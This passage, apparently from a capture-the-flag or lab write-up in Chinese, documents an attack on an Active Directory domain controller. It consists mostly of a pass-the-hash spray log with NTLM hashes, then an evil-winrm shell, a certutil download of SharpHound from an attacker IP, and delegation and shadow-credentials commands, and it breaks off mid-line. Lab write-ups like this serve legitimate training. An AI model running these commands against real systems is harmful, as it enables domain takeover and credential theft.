class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\krbtgt<span class="punctuation">:</span><span class="number">980910</span>b8fc2e4fe9d482123301dd19fe STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\krbtgt<span class="punctuation">:</span>fea5a148c14cf51590456b2102b29fac STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\krbtgt<span class="punctuation">:</span><span class="number">08</span>aca8ed17a9eec9fac4acdcb4652c35 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\krbtgt<span class="punctuation">:</span><span class="number">62e16</span>d17c3015c47b4d513e65ca757a2 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\M.Mason<span class="punctuation">:</span><span class="number">12579</span>b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\M.Mason<span class="punctuation">:</span><span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\M.Mason<span class="punctuation">:</span><span class="number">9</span>ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\M.Mason<span class="punctuation">:</span><span class="number">3004</span>b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\M.Mason<span class="punctuation">:</span><span class="number">3105e0</span>f6af52aba8e11d19f27e487e45 STATUS_PASSWORD_EXPIRED</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\M.Mason<span class="punctuation">:</span><span class="number">204410</span>cc5a7147cd52a04ddae6754b0c STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\M.Mason<span class="punctuation">:</span><span class="number">19</span>a3a7550ce8c505c2d46b5e39d6f808 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\M.Mason<span class="punctuation">:</span><span class="number">3e028552</span>b946cc4f282b72879f63b726 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\M.Mason<span class="punctuation">:</span><span class="number">913</span>c144caea1c0a936fd1ccb46929d3c STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\M.Mason<span class="punctuation">:</span>bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\M.Mason<span class="punctuation">:</span><span class="number">980910</span>b8fc2e4fe9d482123301dd19fe STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\M.Mason<span class="punctuation">:</span>fea5a148c14cf51590456b2102b29fac STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\M.Mason<span class="punctuation">:</span><span class="number">08</span>aca8ed17a9eec9fac4acdcb4652c35 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\M.Mason<span class="punctuation">:</span><span class="number">62e16</span>d17c3015c47b4d513e65ca757a2 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\K.Keen<span class="punctuation">:</span><span class="number">12579</span>b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\K.Keen<span class="punctuation">:</span><span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\K.Keen<span class="punctuation">:</span><span class="number">9</span>ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\K.Keen<span class="punctuation">:</span><span class="number">3004</span>b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\K.Keen<span class="punctuation">:</span><span class="number">3105e0</span>f6af52aba8e11d19f27e487e45 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\K.Keen<span class="punctuation">:</span><span class="number">204410</span>cc5a7147cd52a04ddae6754b0c STATUS_PASSWORD_EXPIRED</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\K.Keen<span class="punctuation">:</span><span class="number">19</span>a3a7550ce8c505c2d46b5e39d6f808 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\K.Keen<span class="punctuation">:</span><span class="number">3e028552</span>b946cc4f282b72879f63b726 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\K.Keen<span class="punctuation">:</span><span class="number">913</span>c144caea1c0a936fd1ccb46929d3c STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\K.Keen<span class="punctuation">:</span>bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\K.Keen<span class="punctuation">:</span><span class="number">980910</span>b8fc2e4fe9d482123301dd19fe STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\K.Keen<span class="punctuation">:</span>fea5a148c14cf51590456b2102b29fac STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\K.Keen<span class="punctuation">:</span><span class="number">08</span>aca8ed17a9eec9fac4acdcb4652c35 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\K.Keen<span class="punctuation">:</span><span class="number">62e16</span>d17c3015c47b4d513e65ca757a2 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\L.Livingstone<span class="punctuation">:</span><span class="number">12579</span>b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\L.Livingstone<span class="punctuation">:</span><span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\L.Livingstone<span class="punctuation">:</span><span class="number">9</span>ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\L.Livingstone<span class="punctuation">:</span><span class="number">3004</span>b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\L.Livingstone<span class="punctuation">:</span><span class="number">3105e0</span>f6af52aba8e11d19f27e487e45 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\L.Livingstone<span class="punctuation">:</span><span class="number">204410</span>cc5a7147cd52a04ddae6754b0c STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>+<span class="punctuation">]</span> resourced.local\L.Livingstone<span class="punctuation">:</span><span class="number">19</span>a3a7550ce8c505c2d46b5e39d6f808</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\L.Livingstone<span class="punctuation">:</span><span class="number">3e028552</span>b946cc4f282b72879f63b726 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\L.Livingstone<span class="punctuation">:</span><span class="number">913</span>c144caea1c0a936fd1ccb46929d3c STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\L.Livingstone<span class="punctuation">:</span>bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\L.Livingstone<span class="punctuation">:</span><span class="number">980910</span>b8fc2e4fe9d482123301dd19fe STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\L.Livingstone<span class="punctuation">:</span>fea5a148c14cf51590456b2102b29fac STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\L.Livingstone<span class="punctuation">:</span><span class="number">08</span>aca8ed17a9eec9fac4acdcb4652c35 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\L.Livingstone<span class="punctuation">:</span><span class="number">62e16</span>d17c3015c47b4d513e65ca757a2 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\J.Johnson<span class="punctuation">:</span><span class="number">12579</span>b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\J.Johnson<span class="punctuation">:</span><span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\J.Johnson<span class="punctuation">:</span><span class="number">9</span>ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\J.Johnson<span class="punctuation">:</span><span class="number">3004</span>b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\J.Johnson<span class="punctuation">:</span><span class="number">3105e0</span>f6af52aba8e11d19f27e487e45 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\J.Johnson<span class="punctuation">:</span><span class="number">204410</span>cc5a7147cd52a04ddae6754b0c STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\J.Johnson<span class="punctuation">:</span><span class="number">19</span>a3a7550ce8c505c2d46b5e39d6f808 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\J.Johnson<span class="punctuation">:</span><span class="number">3e028552</span>b946cc4f282b72879f63b726 STATUS_PASSWORD_EXPIRED</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\J.Johnson<span class="punctuation">:</span><span class="number">913</span>c144caea1c0a936fd1ccb46929d3c STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\J.Johnson<span class="punctuation">:</span>bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\J.Johnson<span class="punctuation">:</span><span class="number">980910</span>b8fc2e4fe9d482123301dd19fe STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\J.Johnson<span class="punctuation">:</span>fea5a148c14cf51590456b2102b29fac STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\J.Johnson<span class="punctuation">:</span><span class="number">08</span>aca8ed17a9eec9fac4acdcb4652c35 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\J.Johnson<span class="punctuation">:</span><span class="number">62e16</span>d17c3015c47b4d513e65ca757a2 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\V.Ventz<span class="punctuation">:</span><span class="number">12579</span>b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\V.Ventz<span class="punctuation">:</span><span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\V.Ventz<span class="punctuation">:</span><span class="number">9</span>ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\V.Ventz<span class="punctuation">:</span><span class="number">3004</span>b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\V.Ventz<span class="punctuation">:</span><span class="number">3105e0</span>f6af52aba8e11d19f27e487e45 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\V.Ventz<span class="punctuation">:</span><span class="number">204410</span>cc5a7147cd52a04ddae6754b0c STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\V.Ventz<span class="punctuation">:</span><span class="number">19</span>a3a7550ce8c505c2d46b5e39d6f808 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\V.Ventz<span class="punctuation">:</span><span class="number">3e028552</span>b946cc4f282b72879f63b726 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>+<span class="punctuation">]</span> resourced.local\V.Ventz<span class="punctuation">:</span><span class="number">913</span>c144caea1c0a936fd1ccb46929d3c</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\V.Ventz<span class="punctuation">:</span>bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\V.Ventz<span class="punctuation">:</span><span class="number">980910</span>b8fc2e4fe9d482123301dd19fe STATUS_LOGON_FAILURE</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>V.Ventz 和 L.Livingston密码可使用, 因为用户名和对应的hash是已知的，理论上不用这样一一尝试</p>
<h2 id="rdp"><a href="#rdp" class="headerlink" title="rdp"></a>rdp</h2><p>尝试rdesktop 登录提示密码错误</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">rdesktop -u L.Livingstone -p <span class="number">19</span>a3a7550ce8c505c2d46b5e39d6f808  <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> -d resourced.local</span><br></pre></td></tr></table></figure>

<p><img data-src="https://thiiiiink.com/202508/asynccode-27.png.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">xfreerdp /u<span class="punctuation">:</span>L.Livingstone /d<span class="punctuation">:</span>resourced.local /v<span class="punctuation">:</span><span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> /pth<span class="punctuation">:</span><span class="number">19</span>a3a7550ce8c505c2d46b5e39d6f808</span><br></pre></td></tr></table></figure>

<p><img data-src="https://thiiiiink.com/202508/asynccode-24.png.png"></p>
<p>不允许不输入密码的情况下登录，无法pth</p>
<h2 id="evil-winrm"><a href="#evil-winrm" class="headerlink" title="evil-winrm"></a>evil-winrm</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">evil-winrm -i <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> -u L.Livingstone -H <span class="number">19</span>a3a7550ce8c505c2d46b5e39d6f808</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3<span class="number">.5</span></span><br><span class="line"></span><br><span class="line">Warning<span class="punctuation">:</span> Remote path completions is disabled due to ruby limitation<span class="punctuation">:</span> quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data<span class="punctuation">:</span> For more information<span class="punctuation">,</span> check Evil-WinRM GitHub<span class="punctuation">:</span> https<span class="punctuation">:</span><span class="comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info<span class="punctuation">:</span> Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C<span class="punctuation">:</span>\Users\L.Livingstone\Documents&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS C<span class="punctuation">:</span>\Users\L.Livingstone&gt; type desktop/local.txt</span><br><span class="line">ca5550158d15c6d29ebefd38d5116193</span><br></pre></td></tr></table></figure>

<h1 id="escalation"><a href="#escalation" class="headerlink" title="escalation"></a>escalation</h1><h2 id="bloodhount"><a href="#bloodhount" class="headerlink" title="bloodhount"></a>bloodhount</h2><p>此前也尝试了本地bloodhount.py没有成功</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">bhpy -dns-tcp -ns <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> -d resourced.local -u &#x27;L.Livingstone&#x27; --hashes <span class="number">19</span>a3a7550ce8c505c2d46b5e39d6f808 -c all</span><br><span class="line">INFO<span class="punctuation">:</span> BloodHound.py for BloodHound LEGACY (BloodHound <span class="number">4.2</span> and <span class="number">4.3</span>)</span><br><span class="line">Traceback (most recent call last)<span class="punctuation">:</span></span><br><span class="line">  File <span class="string">&quot;/home/kali/Tools/windows/BloodHound.py/bloodhound.py&quot;</span><span class="punctuation">,</span> line <span class="number">5</span><span class="punctuation">,</span> in &lt;module&gt;</span><br><span class="line">    bloodhound.main()</span><br><span class="line">  File <span class="string">&quot;/home/kali/Tools/windows/BloodHound.py/bloodhound/__init__.py&quot;</span><span class="punctuation">,</span> line <span class="number">289</span><span class="punctuation">,</span> in main</span><br><span class="line">    lm<span class="punctuation">,</span> nt = args.hashes.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ^^^^^^</span><br><span class="line">ValueError<span class="punctuation">:</span> not enough values to unpack (expected <span class="number">2</span><span class="punctuation">,</span> got <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>通过evil-winrm 下载Sharphound.ps1， 收集信息后下载到本地， evil-WinRM有download命令，可以直接下载。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C<span class="punctuation">:</span>\Users\L.Livingstone&gt; certutil -urlcache -f http<span class="punctuation">:</span><span class="comment">//192.168.45.189/SharpHound.ps1 SharpHound.ps1</span></span><br><span class="line">****  Online  ****</span><br><span class="line">CertUtil<span class="punctuation">:</span> -URLCache command completed successfully.</span><br><span class="line">*Evil-WinRM* PS C<span class="punctuation">:</span>\Users\L.Livingstone&gt; Import-Module .\Sharphound.ps1</span><br><span class="line">*Evil-WinRM* PS C<span class="punctuation">:</span>\Users\L.Livingstone&gt; Invoke-BloodHound -CollectionMethod All -OutputDirectory ./ -OutputPrefix <span class="string">&quot;audit&quot;</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C<span class="punctuation">:</span>\Users\L.Livingstone&gt; download audit_20250206214256_BloodHound.zip</span><br><span class="line"></span><br><span class="line">Info<span class="punctuation">:</span> Downloading C<span class="punctuation">:</span>\Users\L.Livingstone\audit_20250206214256_BloodHound.zip to audit_20250206214256_BloodHound.zip</span><br><span class="line"></span><br><span class="line">Info<span class="punctuation">:</span> Download successful!</span><br></pre></td></tr></table></figure>

<p><img data-src="https://thiiiiink.com/202508/asynccode-25.png.png"></p>
<p>follow the Resource-Based Constrained Delegation:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Resource-Based Constrained Delegation</span><br><span class="line">First<span class="punctuation">,</span> if an attacker does not control an account with an SPN set<span class="punctuation">,</span> a new attacker-controlled computer account can be added with Impacket&#x27;s addcomputer.py example script<span class="punctuation">:</span></span><br><span class="line">addcomputer.py -method LDAPS -computer-name &#x27;ATTACKERSYSTEM$&#x27; -computer-pass &#x27;Summer2018!&#x27; -dc-host $DomainController -domain-netbios $DOMAIN &#x27;domain/user<span class="punctuation">:</span>password&#x27;</span><br><span class="line">We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket&#x27;s rbcd.py script can be used for that purpose<span class="punctuation">:</span></span><br><span class="line">rbcd.py -delegate-from &#x27;ATTACKERSYSTEM$&#x27; -delegate-to &#x27;TargetComputer&#x27; -action &#x27;write&#x27; &#x27;domain/user<span class="punctuation">:</span>password&#x27;</span><br><span class="line">And finally we can get a service ticket for the service name (sname) we want to <span class="string">&quot;pretend&quot;</span> to be <span class="string">&quot;admin&quot;</span> for. Impacket&#x27;s getST.py example script can be used for that purpose.</span><br><span class="line">getST.py -spn &#x27;cifs/targetcomputer.testlab.local&#x27; -impersonate &#x27;admin&#x27; &#x27;domain/attackersystem$<span class="punctuation">:</span>Summer2018!&#x27;</span><br><span class="line">This ticket can then be used with Pass-the-Ticket<span class="punctuation">,</span> and could grant access to the file system of the TARGETCOMPUTER.</span><br><span class="line">Shadow Credentials attack</span><br><span class="line">To abuse this permission<span class="punctuation">,</span> use pyWhisker.</span><br><span class="line">pywhisker.py -d <span class="string">&quot;domain.local&quot;</span> -u <span class="string">&quot;controlledAccount&quot;</span> -p <span class="string">&quot;somepassword&quot;</span> --target <span 